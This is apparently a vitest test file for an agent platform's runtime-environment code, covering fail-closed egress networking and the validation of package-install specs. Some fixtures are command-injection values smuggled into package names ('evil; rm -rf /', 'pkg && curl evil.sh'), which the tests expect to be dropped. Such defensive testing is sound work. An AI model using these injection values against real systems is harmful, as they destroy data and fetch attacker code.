import { afterEach, describe, expect, it, vi } from 'vitest';
import type { RuntimeEnvironmentData } from '@ever-works/plugin';

import { resolveEnvVarNetworking } from './managed-agents-client.js';
import { buildPackageBootstrapPrompt, resolveEnvironmentNetworking } from './runtime-environment.js';

function makeEnvironment(overrides: Partial<RuntimeEnvironmentData> = {}): RuntimeEnvironmentData {
	return {
		id: 'env-1',
		name: 'Python Data',
		slug: 'python-data',
		pipPackages: [],
		npmPackages: [],
		networkingMode: 'unrestricted',
		allowedHosts: null,
		allowPackageManagers: true,
		...overrides
	};
}

describe('resolveEnvironmentNetworking', () => {
	it('returns undefined when no Environment resolved (env-var fallback stays in charge)', () => {
		expect(resolveEnvironmentNetworking(undefined)).toBeUndefined();
	});

	it('maps unrestricted mode to an explicit unrestricted config', () => {
		expect(resolveEnvironmentNetworking(makeEnvironment())).toEqual({ type: 'unrestricted' });
	});

	it('maps limited mode to the CMA limited shape with hosts + package-manager flag', () => {
		const networking = resolveEnvironmentNetworking(
			makeEnvironment({
				networkingMode: 'limited',
				allowedHosts: ['api.anthropic.com', '*.example.com'],
				allowPackageManagers: false
			})
		);
		expect(networking).toEqual({
			type: 'limited',
			allowed_hosts: ['api.anthropic.com', '*.example.com'],
			allow_package_managers: false,
			allow_mcp_servers: false
		});
	});

	it('drops invalid hosts instead of forwarding them (defense in depth)', () => {
		const networking = resolveEnvironmentNetworking(
			makeEnvironment({
				networkingMode: 'limited',
				allowedHosts: ['api.anthropic.com', 'https://evil.example', 'bad host']
			})
		);
		expect(networking).toEqual({
			type: 'limited',
			allowed_hosts: ['api.anthropic.com'],
			allow_package_managers: true,
			allow_mcp_servers: false
		});
	});
});

/**
 * Ever Works #109 — the resolver fails closed. The carrier crosses an RPC
 * boundary in some deployments, so the declared types are not a guarantee:
 * an unrecognised mode must not widen egress, and the two allow flags are
 * granted only by an explicit `true`.
 */
describe('resolveEnvironmentNetworking — fails closed (#109)', () => {
	/** A carrier as it might arrive over the wire, outside the declared types. */
	const untyped = (fields: Record<string, unknown>): RuntimeEnvironmentData =>
		({ ...makeEnvironment(), ...fields }) as unknown as RuntimeEnvironmentData;

	afterEach(() => {
		vi.unstubAllEnvs();
	});

	it.each(['open', 'LIMITED', '', 'none', null, undefined, 42])(
		'an unrecognised networkingMode %j takes the operator env-var policy, not unrestricted',
		(networkingMode) => {
			vi.stubEnv('CLAUDE_MANAGED_AGENT_EGRESS_HOSTS', 'api.anthropic.com, github.com');

			expect(resolveEnvironmentNetworking(untyped({ networkingMode }))).toEqual({
				type: 'limited',
				allowed_hosts: ['api.anthropic.com', 'github.com'],
				allow_package_managers: false,
				allow_mcp_servers: false
			});
		}
	);

	it('an unrecognised networkingMode with no env-var policy gets exactly what a run with no Environment gets', () => {
		vi.stubEnv('CLAUDE_MANAGED_AGENT_EGRESS_HOSTS', '');

		expect(resolveEnvironmentNetworking(untyped({ networkingMode: 'open' }))).toEqual(resolveEnvVarNetworking());
	});

	it.each([undefined, null, 'true', 1, {}])(
		'a limited Environment denies package managers unless the flag is exactly true (got %j)',
		(allowPackageManagers) => {
			const networking = resolveEnvironmentNetworking(
				untyped({ networkingMode: 'limited', allowedHosts: ['api.anthropic.com'], allowPackageManagers })
			);
			expect(networking).toMatchObject({ type: 'limited', allow_package_managers: false });
		}
	);

	it('a limited Environment allows package managers on an explicit true', () => {
		const networking = resolveEnvironmentNetworking(
			makeEnvironment({
				networkingMode: 'limited',
				allowedHosts: ['api.anthropic.com'],
				allowPackageManagers: true
			})
		);
		expect(networking).toMatchObject({ type: 'limited', allow_package_managers: true });
	});

	it.each([undefined, null, 'true', 1, false])(
		'a limited Environment denies MCP servers unless allowMcpServers is exactly true (got %j)',
		(allowMcpServers) => {
			const networking = resolveEnvironmentNetworking(
				untyped({ networkingMode: 'limited', allowedHosts: ['api.anthropic.com'], allowMcpServers })
			);
			expect(networking).toMatchObject({ type: 'limited', allow_mcp_servers: false });
		}
	);

	it("carries the Environment's explicit allowMcpServers: true", () => {
		const networking = resolveEnvironmentNetworking(
			makeEnvironment({ networkingMode: 'limited', allowedHosts: ['api.anthropic.com'], allowMcpServers: true })
		);
		expect(networking).toEqual({
			type: 'limited',
			allowed_hosts: ['api.anthropic.com'],
			allow_package_managers: true,
			allow_mcp_servers: true
		});
	});
});

describe('buildPackageBootstrapPrompt', () => {
	it('returns null with no Environment or with empty package lists', () => {
		expect(buildPackageBootstrapPrompt(undefined)).toBeNull();
		expect(buildPackageBootstrapPrompt(makeEnvironment())).toBeNull();
	});

	it('composes pip and npm install commands from validated specs', () => {
		const prompt = buildPackageBootstrapPrompt(
			makeEnvironment({
				pipPackages: ['pandas==2.2.0', 'requests'],
				npmPackages: ['typescript', '@types/node@^22']
			})
		);
		expect(prompt).toContain("- `pip install 'pandas==2.2.0' 'requests'`");
		expect(prompt).toContain("- `npm install -g 'typescript' '@types/node@^22'`");
		expect(prompt).toContain('Python Data');
	});

	it('silently drops specs that fail re-validation', () => {
		const prompt = buildPackageBootstrapPrompt(
			makeEnvironment({
				pipPackages: ['requests', 'evil; rm -rf /'],
				npmPackages: ['pkg && curl evil.sh']
			})
		);
		expect(prompt).toContain("- `pip install 'requests'`");
		expect(prompt).not.toContain('rm -rf');
		expect(prompt).not.toContain('npm install');
	});

	it('returns null when limited networking forbids the package managers', () => {
		expect(
			buildPackageBootstrapPrompt(
				makeEnvironment({
					networkingMode: 'limited',
					allowedHosts: ['api.anthropic.com'],
					allowPackageManagers: false,
					pipPackages: ['requests'],
					npmPackages: ['typescript']
				})
			)
		).toBeNull();
	});

	it('returns null when a limited Environment carries no package-manager flag (deny by default)', () => {
		const environment = {
			...makeEnvironment({
				networkingMode: 'limited',
				allowedHosts: ['api.anthropic.com'],
				pipPackages: ['requests']
			}),
			allowPackageManagers: undefined
		} as unknown as RuntimeEnvironmentData;
		expect(buildPackageBootstrapPrompt(environment)).toBeNull();
	});

	it('still installs under limited networking when package managers are allowed', () => {
		const prompt = buildPackageBootstrapPrompt(
			makeEnvironment({
				networkingMode: 'limited',
				allowedHosts: ['api.anthropic.com'],
				allowPackageManagers: true,
				pipPackages: ['requests']
			})
		);
		expect(prompt).toContain("- `pip install 'requests'`");
	});

	it('keeps installing under unrestricted networking regardless of the flag', () => {
		const prompt = buildPackageBootstrapPrompt(
			makeEnvironment({ allowPackageManagers: false, pipPackages: ['requests'] })
		);
		expect(prompt).toContain("- `pip install 'requests'`");
	});

	it('returns null when every spec fails re-validation', () => {
		expect(
			buildPackageBootstrapPrompt(makeEnvironment({ pipPackages: ['bad;spec'], npmPackages: ['also bad'] }))
		).toBeNull();
	});
});
